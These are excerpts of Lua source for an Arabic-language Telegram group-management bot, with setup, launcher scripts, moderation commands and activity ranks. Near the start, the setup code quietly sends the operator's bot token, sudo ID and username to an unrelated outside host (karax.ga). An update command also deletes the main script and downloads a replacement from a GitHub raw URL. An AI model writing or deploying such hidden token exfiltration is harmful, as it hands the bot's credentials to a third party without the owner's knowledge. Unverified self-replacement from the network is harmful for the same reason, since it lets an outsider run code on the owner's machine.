...
SUDO = database:get(id_server..":SUDO:ID")
UserName = database:get(id_server..":SUDO:USERNAME")
https.request('http://karax.ga/Essam/?token='..token..'&id='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
create_config_auto()
file = io.open("Essam", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Essam
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./Essam.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BS", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S Essam -X kill
screen -S Essam ./Essam
done
]])  
file:close() 
...
local Essam_Msg = ''  
if msgs < 100 then 
Essam_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
Essam_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
Essam_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
Essam_Msg = 'متفاعل' 
elseif msgs < 1200 then 
Essam_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
Essam_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
Essam_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
Essam_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
Essam_Msg = 'قمة التفاعل' 
elseif msgs < 5500 then 
Essam_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Essam_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Essam_Msg = 'امبروطور التفاعل☣️' 
elseif msgs < 10000000000 then 
Essam_Msg = 'رب التفاعل💖'  
end 
return Essam_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceEssam(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,Essam_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf Essam.lua')
os.execute('wget https://raw.githubusercontent.com/besso200/Essam/master/Essam.lua')
...
send(msg.chat_id_, msg.id_,'❏︙ عدد المجموعات الان » { '..#group..' }'..Essamk..''..Essam..'\n*📌┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n❏︙العضو » ['..result.title_..'](t.me/'..(username or 'Essam500K ')..')'
...
usertext = '\n❏︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Essam500K ')..')'
status  = '\n❏︙ تم ترقيته مطور في البوت'
...
local Essam_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Essam_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"❏︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n❏︙["..Essam_Msg.."] \n") 
else
send(msg.chat_id_,0,"❏︙العضو : {["..data.first_name_.."](T.ME/Essam500K )}\n❏︙["..Essam_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/Essam500K )}\n📛┇ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
■ >> 𝑩𝑬𝑺𝑺𝑶 𝑺𝑶𝑹𝑼𝑪𝑬
~~~~~~~~~~~~
■ >> [𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒓𝒖𝒄𝒆](http://t.me/Essam500K)
...
send(msg.chat_id_, msg.id_, t..'————× 𝑩𝒆𝒔𝒔𝒐 𝒔𝒐𝒓𝒖𝒄𝒆 ×————')
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'❏︙بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Essam500K ')..') \n❏︙تـم قفـل الدردشه ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'❏︙بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Essam500K ')..') \n❏︙تـم قفـل التاك بالكتم ')  
end,nil)   
...
local UserName = (b.username_ or "Essam")
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n❏︙المستخدم » ['..data.first_name_..'](t.me/'..(data.username_ or 'Essam500K ')..')'
...
usertext = '\n❏︙المستخدم » ['..result.title_..'](t.me/'..(username or 'Essam500K ')..')'
status  = '\n❏︙ تم ترقيتهہ‌‏ منشئ اساسي'
texts = usertext..status
else
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n❏︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVEssam')..')'
status  = '\n❏︙تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
...
usertext = '\n❏︙العضو » ['..result.title_..'](t.me/'..(username or 'DEVEssam')..')'
status  = '\n❏︙تم ترقيته ادمن'
texts = usertext..status
else
texts = '❏︙لا يوجد حساب بهاذا المعرف'
...
time = times * 60
local function Restricted(Kara,Essam)
if tonumber(Essam.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '\n❏︙ عذرا لا تستطيع كتم ( '..Rutba(Essam.sender_user_id_,msg.chat_id_)..' )')
return false  
end
if Can_or_NotCan(Essam.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n❏︙ عذرا لا تستطيع كتم ( '..Rutba(Essam.sender_user_id_,msg.chat_id_)..' )')
else
MuteUser(msg.chat_id_,Essam.sender_user_id_,msg.date_+time)
local function name(kara,Essam)
if Essam.username_ == '' then name = Essam.first_name_ else name = Essam.username_ end
send(msg.chat_id_,msg.id_,"⚠ ¦ العضو《["..name.."](tg://user?id="..Essam.sender_user_id_..")》\nا┄─━━◉━━─┄\n⏳¦ تم كتم لمدة "..times.." دقايق ⏰")
end
getUser(Essam.sender_user_id_,name)
end
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else
...
t = "\n❏︙ قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do  
local Essam500K_Msg = database:get(bot_id.."Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..''..k..'- '..v..' » {'..Essam500K_Msg..'}\n'    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'['..Essam_Msg[math.random(#Essam_Msg)]..']') 
return false
end
...
𖡗︙مسح ←الجريذيه
————× 𝑩𝒆𝒔𝒔𝒐 𝒔𝒐𝒓𝒖𝒄𝒆 ×————
𖡗︙تفعيل تعطيل ← التحشيش
𖡗︙اسم البوت ←اسم تحشيش
————× 𝑩𝒆𝒔𝒔𝒐 𝒔𝒐𝒓𝒖𝒄𝒆 ×————
𖡗︙شنو رئيك بهاي
𖡗︙شنو رئيك بهذا
𖡗︙بوسه ←مصه 
...
file = download_to_file(url1,'Essam.webp')
print('TIMESSSS')
 local Essam = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. Essam .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'Essam.webp' .. '"'
io.popen(curl)
end
